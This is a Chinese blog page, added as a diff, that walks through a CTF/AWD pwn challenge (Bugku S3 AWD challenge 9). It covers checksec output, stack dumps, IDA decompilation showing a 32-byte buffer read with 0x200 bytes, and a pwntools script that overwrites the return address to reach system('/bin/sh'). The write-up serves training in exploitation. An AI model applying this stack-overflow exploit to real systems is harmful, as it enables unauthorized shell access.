@@ -1,0 +1,676 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="ningan123">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="二进制下载地址：传送门 检查分析123456789101112[root@ningan 3rd]# file pwnpwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 3.2.0, Bu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【awd系列】Bugku S3 AWD排位赛-9 pwn类型">
+<meta property="og:url" content="http://example.com/2023/08/27/ctf/%E3%80%90awd%E7%B3%BB%E5%88%97%E3%80%91Bugku%20S3%20AWD%E6%8E%92%E4%BD%8D%E8%B5%9B-9%20pwn%E7%B1%BB%E5%9E%8B/index.html">
+<meta property="og:site_name" content="ningan123">
+<meta property="og:description" content="二进制下载地址：传送门 检查分析123456789101112[root@ningan 3rd]# file pwnpwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 3.2.0, Bu">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230827220453.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230827222917.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230827221057.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230827221439.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230827223128.png">
+<meta property="article:published_time" content="2023-08-27T22:01:00.000Z">
+<meta property="article:modified_time" content="2023-08-27T22:39:00.000Z">
+<meta property="article:author" content="ningan123">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230827220453.png">
+  
+  
+  
+  <title>【awd系列】Bugku S3 AWD排位赛-9 pwn类型 - ningan123</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="【awd系列】Bugku S3 AWD排位赛-9 pwn类型"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-27 22:01" pubdate>
+          2023年8月27日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          55 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">【awd系列】Bugku S3 AWD排位赛-9 pwn类型</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h1><p>下载地址：<a target="_blank" rel="noopener" href="https://download.csdn.net/download/weixin_42072280/88260531">传送门</a></p>
+<h1 id="检查分析"><a href="#检查分析" class="headerlink" title="检查分析"></a>检查分析</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan 3rd]<span class="hljs-comment"># file pwn</span><br>pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=b1ddcb889cf95991ae5345be73afb83771de5855, not stripped<br>[root@ningan 3rd]<span class="hljs-comment">#</span><br>[root@ningan 3rd]<span class="hljs-comment"># checksec pwn</span><br>[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)<br>[*] <span class="hljs-string">&#x27;/root/ctf/awd/3rd/pwn&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br><br></code></pre></td></tr></table></figure>
+
+<p>可以看到，安全防护还是比较弱的</p>
+<h1 id="运行二进制"><a href="#运行二进制" class="headerlink" title="运行二进制"></a>运行二进制</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan 3rd]<span class="hljs-comment"># ./pwn</span><br>Your goal is to call `win` <span class="hljs-keyword">function</span> (located at 0x400861)<br><br>   [ Address ]           [ Stack ]<br>                   +--------------------+<br>0x00007ffd6f5c6950 | 0x00007f4272c70b40 | &lt;-- buf<br>                   +--------------------+<br>0x00007ffd6f5c6958 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffd6f5c6960 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffd6f5c6968 | 0x00007f4272e8b170 |<br>                   +--------------------+<br>0x00007ffd6f5c6970 | 0x00007ffd6f5c6980 | &lt;-- saved rbp (vuln)<br>                   +--------------------+<br>0x00007ffd6f5c6978 | 0x000000000040084e | &lt;-- <span class="hljs-built_in">return</span> address (vuln)<br>                   +--------------------+<br>0x00007ffd6f5c6980 | 0x0000000000400ad0 | &lt;-- saved rbp (main)<br>                   +--------------------+<br>0x00007ffd6f5c6988 | 0x00007f4272890c87 | &lt;-- <span class="hljs-built_in">return</span> address (main)<br>                   +--------------------+<br>0x00007ffd6f5c6990 | 0x0000000000000001 |<br>                   +--------------------+<br>0x00007ffd6f5c6998 | 0x00007ffd6f5c6a68 |<br>                   +--------------------+<br><br>Input: 123456<br><br>   [ Address ]           [ Stack ]<br>                   +--------------------+<br>0x00007ffd6f5c6950 | 0x000a363534333231 | &lt;-- buf<br>                   +--------------------+<br>0x00007ffd6f5c6958 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffd6f5c6960 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffd6f5c6968 | 0x00007f4272e8b170 |<br>                   +--------------------+<br>0x00007ffd6f5c6970 | 0x00007ffd6f5c6980 | &lt;-- saved rbp (vuln)<br>                   +--------------------+<br>0x00007ffd6f5c6978 | 0x000000000040084e | &lt;-- <span class="hljs-built_in">return</span> address (vuln)<br>                   +--------------------+<br>0x00007ffd6f5c6980 | 0x0000000000400ad0 | &lt;-- saved rbp (main)<br>                   +--------------------+<br>0x00007ffd6f5c6988 | 0x00007f4272890c87 | &lt;-- <span class="hljs-built_in">return</span> address (main)<br>                   +--------------------+<br>0x00007ffd6f5c6990 | 0x0000000000000001 |<br>                   +--------------------+<br>0x00007ffd6f5c6998 | 0x00007ffd6f5c6a68 |<br>                   +--------------------+<br><br>Bye!<br><br></code></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan 3rd]<span class="hljs-comment"># ./pwn</span><br>Your goal is to call `win` <span class="hljs-keyword">function</span> (located at 0x400861)<br><br>   [ Address ]           [ Stack ]<br>                   +--------------------+<br>0x00007ffe0d6dd760 | 0x00007f02d1bdab40 | &lt;-- buf<br>                   +--------------------+<br>0x00007ffe0d6dd768 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffe0d6dd770 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffe0d6dd778 | 0x00007f02d1df5170 |<br>                   +--------------------+<br>0x00007ffe0d6dd780 | 0x00007ffe0d6dd790 | &lt;-- saved rbp (vuln)<br>                   +--------------------+<br>0x00007ffe0d6dd788 | 0x000000000040084e | &lt;-- <span class="hljs-built_in">return</span> address (vuln)<br>                   +--------------------+<br>0x00007ffe0d6dd790 | 0x0000000000400ad0 | &lt;-- saved rbp (main)<br>                   +--------------------+<br>0x00007ffe0d6dd798 | 0x00007f02d17fac87 | &lt;-- <span class="hljs-built_in">return</span> address (main)<br>                   +--------------------+<br>0x00007ffe0d6dd7a0 | 0x0000000000000001 |<br>                   +--------------------+<br>0x00007ffe0d6dd7a8 | 0x00007ffe0d6dd878 |<br>                   +--------------------+<br><br>Input: aaaaaaaa<br><br>   [ Address ]           [ Stack ]<br>                   +--------------------+<br>0x00007ffe0d6dd760 | 0x6161616161616161 | &lt;-- buf<br>                   +--------------------+<br>0x00007ffe0d6dd768 | 0x000000000000000a |<br>                   +--------------------+<br>0x00007ffe0d6dd770 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffe0d6dd778 | 0x00007f02d1df5170 |<br>                   +--------------------+<br>0x00007ffe0d6dd780 | 0x00007ffe0d6dd790 | &lt;-- saved rbp (vuln)<br>                   +--------------------+<br>0x00007ffe0d6dd788 | 0x000000000040084e | &lt;-- <span class="hljs-built_in">return</span> address (vuln)<br>                   +--------------------+<br>0x00007ffe0d6dd790 | 0x0000000000400ad0 | &lt;-- saved rbp (main)<br>                   +--------------------+<br>0x00007ffe0d6dd798 | 0x00007f02d17fac87 | &lt;-- <span class="hljs-built_in">return</span> address (main)<br>                   +--------------------+<br>0x00007ffe0d6dd7a0 | 0x0000000000000001 |<br>                   +--------------------+<br>0x00007ffe0d6dd7a8 | 0x00007ffe0d6dd878 |<br>                   +--------------------+<br><br>Bye!<br><br></code></pre></td></tr></table></figure>
+
+
+<h1 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h1><p>分析main函数，发现有提示：call win函数</p>
+<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230827220453.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Your goal is to call `win` function (located at %p)\n&quot;</span>, win);<br>  vuln();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+<p>可以看到，读取了一些内容存到了buf变量里，然后就调用了return函数，可以用这个栈溢出漏洞来进行利用</p>
+<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230827222917.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br><br>  _show_stack(buf);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input: &quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x200</span>uLL);<br>  <span class="hljs-keyword">return</span> _show_stack(buf);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>查看win函数，看到有system(“&#x2F;bin&#x2F;sh”)的指令，可以直接利用</p>
+<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230827221057.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">win</span><span class="hljs-params">()</span><br>&#123;<br>  _QWORD v0[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br><br>  v0[<span class="hljs-number">1</span>] = v0;<br>  <span class="hljs-keyword">if</span> ( ((<span class="hljs-type">unsigned</span> __int8)v0 &amp; <span class="hljs-number">0xF</span>) != <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Oops! RSP is misaligned!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Some functions such as `system` use `movaps` instructions in libc-2.27 and later.&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This instruction fails when RSP is not a multiple of 0x10.&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Find a way to align RSP! You&#x27;re almost there!&quot;</span>);<br>    sleep(<span class="hljs-number">1u</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Congratulations!&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  &#125;<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>找到system(“&#x2F;bin&#x2F;sh”);的地址为：0x00000000004008C4</p>
+<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230827221439.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf">.<span class="hljs-built_in">text</span>:<span class="hljs-number">00000000004008</span>C4 <span class="hljs-number">48</span> <span class="hljs-number">8</span>D <span class="hljs-number">3</span>D C4 <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          lea     rdi, command                    ; <span class="hljs-string">&quot;/bin/sh&quot;</span><br>.<span class="hljs-built_in">text</span>:<span class="hljs-number">00000000004008</span>CB E8 A0 FD FF FF                <span class="hljs-built_in">call</span>    <span class="hljs-variable">_system</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>找到填充的间隔为32</p>
+<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230827223128.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan 3rd]<span class="hljs-comment"># ./pwn</span><br>Your goal is to call `win` <span class="hljs-keyword">function</span> (located at 0x400861)<br><br>   [ Address ]           [ Stack ]<br>                   +--------------------+<br>0x00007ffce7496290 | 0x00007f258a829b40 | &lt;-- buf<br>                   +--------------------+<br>0x00007ffce7496298 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffce74962a0 | 0x0000000000000000 |<br>                   +--------------------+<br>0x00007ffce74962a8 | 0x00007f258aa44170 |<br>                   +--------------------+<br>0x00007ffce74962b0 | 0x00007ffce74962c0 | &lt;-- saved rbp (vuln)<br>                   +--------------------+<br>0x00007ffce74962b8 | 0x000000000040084e | &lt;-- <span class="hljs-built_in">return</span> address (vuln)<br>                   +--------------------+<br>0x00007ffce74962c0 | 0x0000000000400ad0 | &lt;-- saved rbp (main)<br>                   +--------------------+<br>0x00007ffce74962c8 | 0x00007f258a449c87 | &lt;-- <span class="hljs-built_in">return</span> address (main)<br>                   +--------------------+<br>0x00007ffce74962d0 | 0x0000000000000001 |<br>                   +--------------------+<br>0x00007ffce74962d8 | 0x00007ffce74963a8 |<br>                   +--------------------+<br><br>Input: ^C<br>[root@ningan 3rd]<span class="hljs-comment">#</span><br>[root@ningan 3rd]<span class="hljs-comment"># python</span><br>Python 3.6.9 (default, Mar 10 2023, 16:46:00)<br>[GCC 8.4.0] on linux<br>Type <span class="hljs-string">&quot;help&quot;</span>, <span class="hljs-string">&quot;copyright&quot;</span>, <span class="hljs-string">&quot;credits&quot;</span> or <span class="hljs-string">&quot;license&quot;</span> <span class="hljs-keyword">for</span> more information.<br>&gt;&gt;&gt; 0x00007ffce74962b0 - 0x00007ffce7496290<br>32<br><br></code></pre></td></tr></table></figure>
+
+<p>上面已经找到system(“&#x2F;bin&#x2F;sh”);的地址为：0x00000000004008C4</p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment"># io = remote(&quot;xxxx&quot;, 9999)  </span><br> <br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br><br>padding = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">32</span> + <span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span><br>return_addr = <span class="hljs-number">0x00000000004008C4</span><br>payload = padding + p64(return_addr)<br><br>io.recvuntil(<span class="hljs-string">&#x27;Input: &#x27;</span>)<br>io.sendline(payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>【awd系列】Bugku S3 AWD排位赛-9 pwn类型</div>
+      <div>http://example.com/2023/08/27/ctf/【awd系列】Bugku S3 AWD排位赛-9 pwn类型/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>ningan123</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月27日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/31/software/%E3%80%90python%E7%B3%BB%E5%88%97%E3%80%91(202308)%20%E5%AE%89%E8%A3%85anaconda/" title="【python系列】(202308) 安装anaconda">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">【python系列】(202308) 安装anaconda</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
